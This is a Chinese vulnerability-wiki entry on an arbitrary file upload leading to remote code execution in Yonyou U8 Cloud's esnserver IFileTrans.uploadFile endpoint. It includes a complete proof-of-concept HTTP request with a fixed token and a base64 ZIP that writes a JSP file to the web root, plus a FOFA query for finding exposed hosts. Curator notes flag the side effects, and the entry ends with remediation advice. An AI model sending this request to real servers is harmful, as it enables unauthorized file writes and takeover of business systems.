---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "用友U8 Cloud esnserver IFileTrans.uploadFile文件写入"
product: "用友U8 Cloud"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "webapps/u8c_web路径；版本未知"
prerequisites: "固定Token有效性/来源未说明"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BU8/%E7%94%A8%E5%8F%8BU8%20Cloud%20esnserver%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"用友-U8-Cloud\""
id: "vw-5f884b5b3d4d6439163097ee"
entity_id: "ve-5f884b5b3d4d6439163097ee"
schema_version: "1"
---

# 用友U8 Cloud esnserver IFileTrans.uploadFile文件写入

## 条目说明

- 对象与具体问题：用友U8 Cloud；esnserver IFileTrans.uploadFile文件写入
- 版本、配置及部署条件：webapps/u8c_web路径；版本未知
- 认证与权限前提：固定Token有效性/来源未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 正文称未经授权却需Token头，必须解释前提并脱敏
- 静态解码p1为ZIP单文件compressed，JSP打印DudeSuite后自删除；不是普通无副作用上传
- JSON正文却标form-urlencoded，缺访问路径/返回判据文本；安全版本未列

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

用友U8 cloud前台任意文件上传导致远程命令执行漏洞。未经授权攻击者通过漏洞上传任意文件，最终可以获取服务器权限。

## 影响版本

用友-U8-Cloud

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="用友-U8-Cloud"

POC/EXP：

```http
POST /service/esnserver HTTP/1.1 
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 
Accept-Encoding: gzip, deflate 
Content-Type: application/x-www-form-urlencoded 
Token: 469ce01522f64366750d1995ca119841 

{"invocationInfo":{"ucode":"123","dataSource":"U8cloud","lang":"en"},"method":"uploadFile","className":"nc.itf.hr.tools.IFileTrans","param":{"p1":"UEsDBAoAAAAAAA9tSFkDJCbXbQAAAG0AAAAKAAAAY29tcHJlc3NlZDwlIG91dC5wcmludGxuKCJEdWRlU3VpdGUiKTsgbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTsgJT5QSwECHwAKAAAAAAAPbUhZAyQm120AAABtAAAACgAkAAAAAAAAACAAAAAAAAAAY29tcHJlc3NlZAoAIAAAAAAAAQAYACbiFZZEGdsBHOcblEgZ2wERXscDRxnbAVBLBQYAAAAAAQABAFwAAACVAAAAAAA=","p2":"webapps/u8c_web/test123.jsp"},"paramType":["p1:[B","p2:java.lang.String"]}
```

> 请求长度说明：原资料 Content-Length 为 583；静态长度已移除，应由客户端根据最终请求体的字节数生成。


![image-20241016202231914](./.resource/用友U8Cloudesnserver存在任意文件上传漏洞/media/image-20241016202231914.png)


![image-20241016202330794](./.resource/用友U8Cloudesnserver存在任意文件上传漏洞/media/image-20241016202330794.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
